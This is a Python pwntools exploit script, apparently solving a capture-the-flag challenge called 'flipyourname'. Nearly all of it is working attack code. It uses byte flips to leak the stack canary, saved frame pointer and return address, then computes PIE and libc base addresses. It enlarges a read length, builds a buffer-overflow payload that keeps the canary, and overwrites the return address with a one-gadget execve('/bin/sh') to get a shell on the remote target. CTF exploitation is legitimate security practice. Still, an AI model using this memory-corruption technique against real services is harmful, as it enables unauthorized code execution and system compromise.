#!/usr/bin/env python3
import time
from pwn import *

BINARY_PATH = './flipyourname'
context.terminal = ['tmux', 'splitw', '-h']
libc = None
one_gadget_offset = None
context.log_level = 'debug'

def conn():
    global ERROR_BY_NETWORK_LATENCY
    global libc
    global one_gadget_offset

    if len(sys.argv) == 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
        libc = ELF('./libc.so.6')

        # 0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
        # constraints:
        #   address rbp-0x50 is writable
        #   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
        #   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid env
        one_gadget_offset = 0xebd43
    else:
        #r = process(BINARY_PATH)
        r = remote('localhost', 80)
        libc = ELF('./libc.so.6')
        #libc = ELF('/usr/lib/libc.so.6')

        # 0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
        # constraints:
        #   address rbp-0x50 is writable
        #   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
        #   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid env
        one_gadget_offset = 0xebd43
    return r

# NOTE: if values which are candidates of any leak contain null bytes,
#       the leak will be failed. then, run again!


r = conn()


# the address of name   = rbp + rax - 0x60 (rax is index)
# the address of canary = rbp - 0x8
# the address of SFP    = rbp
# the address of the RA = rbp + 0x8


# leak canary and buf's start address (flips rbp-0x10 ~ rbp-0x7, rbp-0x8)
for i in range(0x51, 0x58 + 1):
    r.sendafter(b'name? ', b'a' * 80)
    r.sendlineafter(b'flip your name :) ', str(i).encode())
    res = r.sendlineafter(b'want to quit? ', b'n')

r.sendafter(b'name? ', b'a' * 80)
r.sendlineafter(b'flip your name :) ', str(0x50).encode())
res = r.sendlineafter(b'want to quit? ', b'n')

print(res)

canary = u64(b'\x00' + res.split(b'a' * 80)[1][9:16])
print('canary..', hex(canary))
sfp = u64(res.split(b'a' * 80)[1][16:22] + b'\x00\x00')
print('sfp..', hex(sfp))
name_addr = sfp - 0x70
print('name_addr..', hex(name_addr))

#gdb.attach(r)
#pause()

# leak pie base address (flips rbp-0x10, rbp+0x0 ~ rbp+0x7)
for i in range(0x60, 0x68):
    r.sendlineafter(b'name? ', b'a' * 80)
    r.sendlineafter(b'flip your name :) ', str(i).encode())
    r.sendlineafter(b'want to quit? ', b'n')

r.sendlineafter(b'name? ', b'a' * 80)
r.sendlineafter(b'flip your name :) ', str(0x50).encode())
res = r.sendlineafter(b'want to quit? ', b'n')

print(res)

return_address = u64(res.split(b'a' * 80)[1][24:30] + b'\x00\x00')
print('return_address..', hex(return_address))
pie_base = return_address - 0x1345
print('pie_base..', hex(pie_base))


# flips memory that represents the read()'s length
target_memory_addr = pie_base + 0x4010
print('target_memory_addr..', hex(target_memory_addr))
offset_to_target_memory = target_memory_addr - name_addr
print('offset_to_target_memory..', offset_to_target_memory)

r.sendlineafter(b'name? ', b'a')
r.sendlineafter(b'flip your name :) ', str(offset_to_target_memory).encode())
res = r.sendlineafter(b'want to quit? ', b'n')


# leak libc base
payload = b'a' * (88 + 8 + 8 + 8 + 8)  # note + canary + SFP + foo()'s RA + _

r.sendafter(b'name? ', payload)
r.sendlineafter(b'flip your name :) ', str(0).encode())
res = r.sendlineafter(b'want to quit? ', b'n')

libc_start_call_main_x = u64(res.split(b'a' * (88 + 8 + 8 + 8 + 7))[1][:6] + b'\x00\x00')
print('libc_start_call_main_x..', hex(libc_start_call_main_x))
libc_base = libc_start_call_main_x - libc.libc_start_main_return
print('libc_base..', hex(libc_base))


# overwrite the return address with one-gadget
payload = b''
payload += b'b' * 88
payload += p64(canary)
payload += p64(pie_base + 0x4800)  # the valid memory addres for one-gadget's precondition
payload += p64(libc_base + one_gadget_offset)

r.sendafter(b'name? ', payload)
r.sendlineafter(b'flip your name :) ', str(0).encode())
res = r.sendlineafter(b'want to quit? ', b'y')

# get shell
r.interactive()

